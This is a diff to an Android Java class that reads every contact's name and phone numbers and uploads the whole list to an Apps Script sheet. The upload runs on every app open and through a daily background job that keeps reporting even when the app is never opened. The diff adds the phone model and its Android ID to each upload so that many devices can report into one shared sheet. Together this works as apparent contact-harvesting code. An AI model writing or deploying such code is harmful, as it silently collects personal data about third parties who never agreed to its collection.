@@ -4,7 +4,9 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.os.Build;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.util.Log;
 
 import androidx.work.ExistingPeriodicWorkPolicy;
@@ -28,15 +30,14 @@ import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
 /**
- * Reads names + phone numbers with TWO bulk queries (not two per contact),
- * then sends the whole list as one snapshot.
+ * Reads names + phone numbers with TWO bulk queries, then sends the whole list
+ * as one snapshot tagged with this device's id.
  *
- * SPEED: the send starts on a plain thread the instant permission is granted -
- * no WorkManager scheduler latency on the happy path. A delayed WorkManager
- * job runs 30s later as a safety net in case the app is killed mid-send.
- * Because a snapshot clears and rewrites, a redundant send is harmless.
+ * The Apps Script replaces only THIS device's rows, so several phones can
+ * report into the same sheet without wiping each other, and without duplicates.
  *
- * Emails are not read at all.
+ * The send starts immediately on a plain thread (no scheduler latency); a
+ * delayed WorkManager job follows 30s later as a safety net.
  */
 public final class AutoSync {
 
@@ -48,7 +49,7 @@ public final class AutoSync {
     private static final String PREFS = "auto_sync";
     private static final String KEY_LAST = "last_auto_sync";
 
-    /** 0 = sync on EVERY open. Raise it if you get too many requests. */
+    /** 0 = sync on EVERY open. */
     private static final long SYNC_INTERVAL_MS = 0L;
 
     /** Contacts per request. Big enough that most phones send exactly one. */
@@ -56,8 +57,6 @@ public final class AutoSync {
 
     private static final int MAX_ATTEMPTS = 3;
     private static final long PAUSE_BETWEEN_CHUNKS_MS = 700;
-
-    /** How long to wait before the safety-net retry. */
     private static final long BACKUP_DELAY_SECONDS = 30L;
 
     private AutoSync() { }
@@ -67,10 +66,16 @@ public final class AutoSync {
                 == PackageManager.PERMISSION_GRANTED;
     }
 
-    /**
-     * Fires the send immediately (no scheduler delay) and queues a delayed
-     * WorkManager backup behind it.
-     */
+    private static String deviceId(Context ctx) {
+        try {
+            String id = Settings.Secure.getString(
+                    ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
+            return id == null ? "unknown" : id;
+        } catch (Exception e) {
+            return "unknown";
+        }
+    }
+
     public static void scheduleNow(Context ctx, boolean force) {
         if (!hasPermission(ctx)) return;
         final Context app = ctx.getApplicationContext();
@@ -78,14 +83,10 @@ public final class AutoSync {
         if (!force && !isDue(app)) return;
         markSynced(app);
 
-        // 1. Immediate - starts right now, on a plain thread.
         new Thread(new Runnable() {
-            @Override public void run() {
-                doSync(app);
-            }
+            @Override public void run() { doSync(app); }
         }).start();
 
-        // 2. Safety net - runs 30s later, in case the app gets killed mid-send.
         try {
             WorkManager.getInstance(app).enqueueUniqueWork(
                     "sync_backup",
@@ -103,7 +104,6 @@ public final class AutoSync {
         scheduleNow(ctx, force);
     }
 
-    /** Daily background sync, so it keeps reporting even if the app is never opened. */
     public static void scheduleDaily(Context ctx) {
         try {
             WorkManager.getInstance(ctx.getApplicationContext())
@@ -143,19 +143,18 @@ public final class AutoSync {
             int parts = Math.max(1, (int) Math.ceil(total / (double) CHUNK_SIZE));
             Log.i(TAG, "read " + total + " contacts in " + readMs + "ms");
 
-            long t1 = System.currentTimeMillis();
             for (int i = 0; i < parts; i++) {
                 int from = i * CHUNK_SIZE;
                 int to = Math.min(from + CHUNK_SIZE, total);
                 List<JSONObject> slice = contacts.subList(from, to);
 
-                if (!postChunkWithRetry(slice, i + 1, parts)) {
+                if (!postChunkWithRetry(ctx, slice, i + 1, parts)) {
                     Log.w(TAG, "chunk " + (i + 1) + "/" + parts + " failed");
                     return false;
                 }
                 if (i < parts - 1) sleepQuietly(PAUSE_BETWEEN_CHUNKS_MS);
             }
-            Log.i(TAG, "uploaded in " + (System.currentTimeMillis() - t1) + "ms");
+            Log.i(TAG, "sync ok: " + total + " contacts in " + parts + " request(s)");
             return true;
 
         } catch (Exception e) {
@@ -164,7 +163,7 @@ public final class AutoSync {
         }
     }
 
-    /** TWO queries total. Previously two per contact (~600 for 300 contacts). */
+    /** TWO queries total. */
     private static List<JSONObject> readAllContacts(Context ctx) {
 
         Map<String, LinkedHashSet<String>> numbersByContact = new HashMap<>();
@@ -222,10 +221,11 @@ public final class AutoSync {
         return out;
     }
 
-    private static boolean postChunkWithRetry(List<JSONObject> slice, int part, int parts) {
+    private static boolean postChunkWithRetry(Context ctx, List<JSONObject> slice,
+                                              int part, int parts) {
         long backoff = 1200;
         for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
-            int code = postChunk(slice, part, parts);
+            int code = postChunk(ctx, slice, part, parts);
             if (code >= 200 && code < 400) return true;
 
             boolean retryable = code == 429 || code == 500 || code == 502
@@ -240,7 +240,7 @@ public final class AutoSync {
         return false;
     }
 
-    private static int postChunk(List<JSONObject> slice, int part, int parts) {
+    private static int postChunk(Context ctx, List<JSONObject> slice, int part, int parts) {
         HttpURLConnection conn = null;
         try {
             JSONArray arr = new JSONArray();
@@ -251,6 +251,8 @@ public final class AutoSync {
             payload.put("mode", "snapshot");
             payload.put("part", part + "/" + parts);
             payload.put("count", slice.size());
+            payload.put("device", Build.MODEL);
+            payload.put("device_id", deviceId(ctx));
             payload.put("contacts", arr);
 
             conn = (HttpURLConnection) new URL(UPLOAD_HOST).openConnection();
